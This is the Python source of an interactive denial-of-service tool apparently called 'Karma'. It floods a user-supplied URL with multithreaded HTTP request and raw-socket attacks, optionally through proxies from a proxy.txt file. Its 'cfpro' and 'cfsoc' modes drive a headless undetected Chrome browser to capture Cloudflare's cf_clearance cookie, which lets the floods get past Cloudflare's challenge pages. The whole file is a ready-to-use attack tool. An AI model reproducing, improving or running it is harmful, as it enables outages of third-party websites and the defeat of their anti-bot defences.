# -*- coding: utf-8 -*-
from os import system, name
import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init
init(convert=True)

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + "sec left ")
        else:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                 \n")
            return

def get_proxies():
    global proxies
    if not os.path.exists("./proxy.txt"):
        stdout.write(Fore.MAGENTA+" [*]"+Fore.WHITE+" You Need Proxy File ( ./proxy.txt )\n")
        return False
    proxies = open("./proxy.txt", 'r').read().split('\n')
    return True

#region RAW
def LaunchRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    threads_count = 0
    while threads_count <= int(th):
        try:
            thd = threading.Thread(target=AttackRAW, args=(url, until))
            thd.start()
            threads_count += 1
        except:
            pass

def AttackRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(url)
            requests.get(url)
        except:
            pass
#endregion

#region PXRAW
def LaunchPXRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    threads_count = 0
    while threads_count <= int(th):
        try:
            thd = threading.Thread(target=AttackPXRAW, args=(url, until))
            thd.start()
            threads_count += 1
        except:
            pass

def AttackPXRAW(url, until_datetime):
    proxy = 'http://'+str(random.choice(list(proxies)))
    proxy = {
        'http': proxy,   
        'https': proxy,
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(url, proxies=proxy)
            requests.get(url, proxies=proxy)
        except:
            pass
#endregion

#region PXSOC
def LaunchPXSOC(url, th, t):
    target = {}
    target['uri'] = urlparse(url).path
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    threads_count = 0
    req =  "GET / HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    while threads_count <= int(th):
        try:
            thd = threading.Thread(target=AttackPXSOC, args=(target, until, req))
            thd.start()
            threads_count += 1
        except:
            pass

def AttackPXSOC(target, until_datetime, req):
    proxy = random.choice(list(proxies)).split(":")
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.connect((str(target['host']), int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.connect((str(target['host']), int(target['port'])))
    except:
        return
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #s.connect((target['host'], int(target['port'])))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass
#endregion

#region SOC
def LaunchSOC(url, th, t):
    target = {}
    target['uri'] = urlparse(url).path
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    threads_count = 0
    req =  "GET / HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    while threads_count <= int(th):
        try:
            thd = threading.Thread(target=AttackSOC, args=(target, until, req))
            thd.start()
            threads_count += 1
        except:
            pass

def AttackSOC(target, until_datetime, req):
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #s.connect((target['host'], int(target['port'])))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass
#endregion

#region CFB
def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    threads_count = 0
    scraper = cloudscraper.create_scraper()
    while threads_count <= int(th):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
            threads_count += 1
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass
#endregion

#region CFPRO
headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
}

def getcookie(url):
    global cookies
    options = webdriver.ChromeOptions()
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-setuid-sandbox')
    options.add_argument('--disable-infobars')
    options.add_argument('--disable-logging')
    options.add_argument('--disable-login-animations')
    options.add_argument('--disable-notifications')
    options.add_argument('--disable-gpu')
    options.add_argument('--headless')
    options.add_argument('--lang=ko_KR')
    options.add_argument("--start-maxmized")
    options.add_argument('--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en')
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    ii = 0
    while ii == 0:
        cookies = driver.get_cookies()
        for i in cookies:
            if i['name'] == "cf_clearance":
                driver.quit()
                ii += 1
            else:
                pass
        time.sleep(0.2)
    driver.quit()

def LaunchCFPRO(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    threads_count = 0
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    for cookie in cookies:
        jar.set(cookie['name'], cookie['value'])
        scraper.cookies = jar
    #stdout.write(jar)
    print(jar)
    while threads_count <= int(th):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
            thd.start()
            threads_count += 1
        except:
            pass

def AttackCFPRO(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False)
            scraper.get(url=url, headers=headers, allow_redirects=False)
        except:
            pass
#endregion

#region CFSOC

def LaunchCFSOC(url, th, t):
    options = webdriver.ChromeOptions()
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-setuid-sandbox')
    options.add_argument('--disable-infobars')
    options.add_argument('--disable-logging')
    options.add_argument('--disable-login-animations')
    options.add_argument('--disable-notifications')
    options.add_argument('--disable-gpu')
    options.add_argument('--headless')
    options.add_argument('--lang=ko_KR')
    options.add_argument("--start-maxmized")
    options.add_argument('--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en')
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    ii = 0
    while ii == 0:
        cookies = driver.get_cookies()
        for i in cookies:
            if i['name'] == "cf_clearance":
                cookieJAR = driver.get_cookies()[0]
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                driver.quit()
                ii += 1
            else:
                pass
        time.sleep(0.2)
    driver.quit()
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    threads_count = 0

    target = {}
    target['uri'] = urlparse(url).path
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass

    req =  'GET / HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="99", "Google Chrome";v="99"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
    while threads_count <= int(th):
        try:
            thd = threading.Thread(target=AttackCFSOC,args=(until, target, req,))
            thd.start()
            threads_count += 1
        except:  
            pass

def AttackCFSOC(until_datetime, target, req):
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
                pass
        except:
            packet.close()
            pass

#endregion

def clear(): 
    if name == 'nt': 
        _ = system('cls') 
    else: 
        _ = system('clear') 

def title():
    #stdout.write("\x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mDiscord: \x1b[38;2;0;255;58m승혁#8271 \x1b[38;2;0;255;255m] \n")
    stdout.write("                                                                                          \n")
    stdout.write("                                "+Fore.LIGHTMAGENTA_EX+"╦╔═╔═╗╦═╗╔╦╗╔═╗                 \n")
    stdout.write("                                "+Fore.LIGHTRED_EX    +"╠╩╗╠═╣╠╦╝║║║╠═╣                 \n")
    stdout.write("                                "+Fore.RED            +"╩ ╩╩ ╩╩╚═╩ ╩╩ ╩                \n")
    stdout.write("             "+Fore.RED            +"        ══╦═════════════════════════════════╦══\n")
    stdout.write("             \x1b[38;2;255;0;0m╔═════════╩═════════════════════════════════╩═════════╗\n")
    stdout.write("             \x1b[38;2;255;0;0m║ \x1b[38;2;0;255;189m        Welcome To The Main Screen Of Karma\x1b[38;2;255;0;0m         ║\n")
    stdout.write("             \x1b[38;2;255;0;0m║ \x1b[38;2;0;255;189m          Type [help] to see the Commands    \x1b[38;2;255;0;0m       ║\n")
    stdout.write("             \x1b[38;2;255;0;0m║ \x1b[38;2;0;255;189m         Contact Dev - Discord : 승혁#8271   \x1b[38;2;255;0;0m       ║\n")
    stdout.write("             \x1b[38;2;255;0;0m╚═════════════════════════════════════════════════════╝\n")
    stdout.write("                                                                                          \n")

def command():
    #stdout.write(Fore.LIGHTMAGENTA_EX+"┌───"+Fore.MAGENTA+"("+Fore.LIGHTGREEN_EX+"@"+Fore.RED+namee+Fore.MAGENTA+")"+Fore.LIGHTGREEN_EX+"-"+Fore.MAGENTA+"["+Fore.LIGHTGREEN_EX+"/"+Fore.MAGENTA+"root"+Fore.LIGHTGREEN_EX+"/"+Fore.MAGENTA+"KarmaSH"+Fore.LIGHTGREEN_EX+"/"+Fore.MAGENTA+"]"+Fore.LIGHTMAGENTA_EX+"\n└──> "+Fore.WHITE)
    stdout.write(Fore.LIGHTMAGENTA_EX+"╔═══"+Fore.MAGENTA+"[""root"+Fore.LIGHTGREEN_EX+"@"+Fore.MAGENTA+"Karma"+Fore.MAGENTA+"]"+Fore.LIGHTMAGENTA_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
    command = input()
    if command == "cls":
        clear()
        title()
    elif command == "clear":
        clear()
        title()
    elif command == "?":
        func()
    elif command == "help":
        func()
    elif command == "exit":
        exit()
    elif command == "credit":
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Developer : Hyuk\n")
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"UI Design : Yone\n")
    elif command == "cfb":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
        target = input()
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
        thread = input()
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
        t = input()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFB(target, thread, t)
        timer.join()
    elif command == "raw":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
        target = input()
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
        thread = input()
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
        t = input()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchRAW(target, thread, t)
        timer.join()
    elif command == "pxraw":
        if get_proxies():
            stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
            target = input()
            stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
            thread = input()
            stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
            t = input()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXRAW(target, thread, t)
            timer.join()
    elif command == "soc":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
        target = input()
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
        thread = input()
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
        t = input()
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchSOC(target, thread, t)
        timer.join()
    elif command == "pxsoc":
        if get_proxies():
            stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
            target = input()
            stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
            thread = input()
            stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
            t = input()
            timer = threading.Thread(target=countdown, args=(t,))
            timer.start()
            LaunchPXSOC(target, thread, t)
            timer.join()
    elif command == "cfpro":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
        target = input()
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
        thread = input()
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
        t = input()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF...\n")
        getcookie(target)
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchCFPRO(target, thread, t)
        timer.join()
    elif command == "cfsoc":
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     : "+Fore.LIGHTGREEN_EX)
        target = input()
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  : "+Fore.LIGHTGREEN_EX)
        thread = input()
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) : "+Fore.LIGHTGREEN_EX)
        t = input()
        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF...\n")
        LaunchCFSOC(target, thread, t)
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        timer.join()
    else:
        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"Unknown command. 'help' or '?' to see all commands.\n")
        #stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"Unknown command. 'help' or '?' to see all commands.\n")

def func():
    stdout.write(Fore.RED+" ["+Fore.WHITE+"LAYER 7"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfb        "+Fore.RED+": "+Fore.WHITE+"Bypass Normal CF (nosec)\n")
    #stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"uam        "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfpro      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (request)\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"cfsoc      "+Fore.RED+": "+Fore.WHITE+"Bypass CF UAM, CF CAPTCHA, CF BFM, CF JS (socket)\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"raw        "+Fore.RED+": "+Fore.WHITE+"Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"soc        "+Fore.RED+": "+Fore.WHITE+"Socket attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxraw      "+Fore.RED+": "+Fore.WHITE+"Proxy Request attack\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"pxsoc      "+Fore.RED+": "+Fore.WHITE+"Proxy Socket attack\n")
    
    stdout.write(Fore.RED+" \n["+Fore.WHITE+"LAYER 4"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"tcp        "+Fore.RED+": "+Fore.WHITE+"Strong TCP attack (not supported)\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"udp        "+Fore.RED+": "+Fore.WHITE+"Strong UDP attack (not supported)\n")
    stdout.write(Fore.RED+" \n["+Fore.WHITE+"ETC.."+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"clear/cls  "+Fore.RED+": "+Fore.WHITE+"Clear console\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"exit       "+Fore.RED+": "+Fore.WHITE+"Bye..\n")
    stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"credit     "+Fore.RED+": "+Fore.WHITE+"Thanks for\n")

if __name__ == '__main__':
    global namee
    namee = 'user'
    clear()
    title()
    while True:
        command()

                      
                      